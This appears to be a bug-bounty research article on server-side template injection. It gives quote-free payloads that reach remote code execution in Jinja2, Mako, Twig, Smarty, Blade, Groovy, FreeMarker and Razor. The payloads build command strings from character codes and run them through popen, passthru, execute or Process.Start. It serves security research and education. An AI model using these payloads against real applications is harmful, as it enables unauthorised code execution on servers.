

Limitations are just an illusion - advanced server-side template exploitation with RCE everywhere
August 27, 2024

##
#
https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation
#
##

server-side template injection
This article explains some novel techniques for exploiting server-side template injections (SSTIs) with complex, unique payloads that leverage default methods and syntax from various template engines. Even better, we will show how to do so without needing any quotation marks or extra plugins within the templates. All server-side template injection payloads detailed below can achieve remote code execution (RCE) on the target applications.

By default, many template engines have auto-escape enabled or perform HTML escape before the template rendering process. This sometimes makes our exploitation scenario much more difficult because of quote filtering used to render string-based data. Without string-based data in some form, RCE is significantly harder to achieve for some template engines, Twig being a notable example. For others, however, exploitation remains relatively simple even without the use of quotation marks. Our Jinja2 exploit was simplified, for instance, by the availability of the chr Python function.

Outline
Goal
Template engines
Exploitation and payload development
Jinja2
Mako
Twig
Smarty
Blade
Groovy
FreeMarker
Razor
Research roadmap
Acknowledgments
Goal
The goal of our research was simple: to create payloads for some of the most popular template engines with the impact being an RCE. The payloads should not rely on any resources, such as HTTP parameters, outside of the payload itself. Achieving this would ensure the payload works in as many exploitation scenarios as possible.

Template engines
Our research attempted to achieve a payload in relation to our goal on the following template engines:

Jinja2 (Python)
Mako (Python)
Twig (PHP)
Smarty (PHP)
Blade (PHP)
Groovy (Java)
FreeMarker (Java)
Razor (.NET)
Exploitation and payload development
As we said before, all payloads use only the default functions and methods from the template engine and don’t take advantage of any quotes or resources available outside the template engine itself, such as parameters in the HTTP request. Despite these limitations, all payloads can be used to achieved a RCE on an application vulnerable to a server-side template injection.

Jinja2
Jinja2, the default template engine used within Flask, is very powerful since it makes it possible to write and execute pure Python code.

To write a simple string, we can write this payload (note: index values may vary):

{{self.__init__.__globals__.__str__()[1786:1788]}}
The payload takes advantage of self.__init__.__globals__, which contains all global variables accessible to that function. This is then converted to a string with the help of the __str__ method. To build our string, we take advantage of index positions 1786 and 1788 from the converted __globals__ string, which finally returns the string: id.

We can now leverage this technique to build a payload that performs a remote code execution and runs system command id:

{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(self.__init__.__globals__.__str__()[1786:1788]).read()}}
A similar payload structure can be used to exploit one of the Dojo challenges - Coffee Shop that used Jinja2 as it's template engine and filtered out all quotation marks.

Mako
Mako is another template engine compatible with Python and is used by default by Python frameworks Pyramid and Pylons.

In Mako, a payload such as the one below will generate the string id:

${str().join(chr(i)for(i)in[105,100])}
We can then use this crafted string within Python’s os.popen function to achieve RCE:

${self.module.cache.util.os.popen(str().join(chr(i)for(i)in[105,100])).read()}
Although you could also use a payload like the one below, it requires the use of "less-than" (&lt;) and "greater-than" (&gt;) characters – putting it outside the scope of our research objective:

<%import os%>${os.popen(str().join(chr(i)for(i)in[105,100])).read()}
Twig
Twig, the PHP template engine, was one of the most challenging template engines to find a working payload for. The biggest challenge of all was making a string from its built-in and default configurations.

Fortunately, I managed to craft a payload by leveraging the block feature and built-in _charset variable. Finally, I nested them together, which resulted in a successful payload:

{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}
I also discovered an interesting payload that takes advantage of the built-in _context variable.

This payload allows you to achieve RCE if a template engine has performed a double rendering process.

{{id~passthru~_context|join|slice(2,2)|split(000)|map(_context|join|slice(5,8))}}
Smarty
In PHP template engine Smarty, we can take advantage of the chr function to generate a string based on the Hexadecimal value. We then use the variable modifier cat to concatenate our other generated chars and complete the string. The resulting string id is as follows:

{chr(105)|cat:chr(100)}
Similar to Twig, we can use the function passthru to execute our generated string and achieve RCE:

{{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}
Blade
Blade is the default template engine for the Laravel framework. We can use the chr function to convert hexadecimal values to characters, insert the characters into an array map, and use implode to join all generated characters into a string.

The following code generates the string id that will be used in our final payload:

{{implode(null,array_map(chr(99).chr(104).chr(114),[105,100]))}}
Combined with the string generated from our previous payload, we can use passthru to execute the id command, which results in remote code execution:

{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}
Groovy
Groovy is a Java-based template engine mainly used in the Grails framework. It’s a powerful engine. In Groovy, you can craft a string using either of the following methods:

${((char)105).toString()+((char)100).toString()}
Or:

${x=new String();for(i in[105,100]){x+=((char)i)}}
We can then use the execute function to run the resulting string-based command as a system command:

${x=new String();for(i in[105,100]){x+=((char)i).toString()};x.execute().text}
If you prefer the payload to have no spaces, you can always use a multi comment (/**/) as an alternative:

${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}${x=new/**/String();for(i/**/in[105,100]){x+=((char)i).toString()};x.execute().text}
FreeMarker
FreeMarker is a popular template engine used in Java-based applications and is supported by a variety of frameworks, including Spring and Apache struts.

Our efforts to generate a suitable string in FreeMarker led to the discovery of a pretty neat function: lower_abc. This function converts int based values into a string – but not in the way you might expect from functions such as chr in Python, as the documentation for lower_abc explains:


Converts 1, 2, 3, etc., to the string "a", "b", "c", etc. When reaching "z", it continues like "aa", "ab", etc. This is the same logic that you can see in column labels in spreadsheet applications (like Excel or Calc). The lowest allowed number is 1. There's no upper limit. If the number is 0 or less or it isn't an integer number then the template processing will be aborted with error.

So if you wanted a string that represents the letter "a", you could use the payload:

${1?lower_abc}
The string "aa", meanwhile, can be generated with the payload:

${27?lower_abc}
By using this method, you can build a string that can be used to create a payload such as the following, with the impact being RCE:

${(6?lower_abc+18?lower_abc+5?lower_abc+5?lower_abc+13?lower_abc+1?lower_abc+18?lower_abc+11?lower_abc+5?lower_abc+18?lower_abc+1.1?c[1]+20?lower_abc+5?lower_abc+13?lower_abc+16?lower_abc+12?lower_abc+1?lower_abc+20?lower_abc+5?lower_abc+1.1?c[1]+21?lower_abc+20?lower_abc+9?lower_abc+12?lower_abc+9?lower_abc+20?lower_abc+25?lower_abc+1.1?c[1]+5?upper_abc+24?lower_abc+5?lower_abc+3?lower_abc+21?lower_abc+20?lower_abc+5?lower_abc)?new()(9?lower_abc+4?lower_abc)}
Razor
Built into ASP.NET core, Razor is a powerful template engine that can run pure C# code. The ability to generate a string by taking full advantage of the C# programming language opens up a wide range of payload possibilities.

For instance, the following payload generates the string whoami:

@{string x=null;int[]l={119,104,111,97,109,105};foreach(int c in l){x+=((char)c).ToString();};}@x
If you then want to run this command as a system command, you can use @System.Diagnostics.Process.Start and replace _PROGRAM_ with the program type, such as cmd.exe, and replace _COMMAND_ with your generated string command:

@System.Diagnostics.Process.Start(_PROGRAM_,_COMMAND_);
Research roadmap
Achieving RCE in various popular template engines in this manner – with unique payloads that use only built-in methods/functions – shows just how much you can do with a program even when limited to using minimal resources.

There are still plenty of template engines that I personally have yet to investigate. For anyone interested in building on my research, I believe there are payloads following the same structure that could also achieve RCE in the template engines not covered here. I would say that is a good way to start.

Acknowledgments
A big thank you to the template Injection playground made by Hackmanit! They made the payload testing a lot easier!

Finally, I would like to thank the guys at SCH Tech for their research: RAZOR PAGES SSTI & RCE and James Kettle for his research on Server-Side Template Injection.
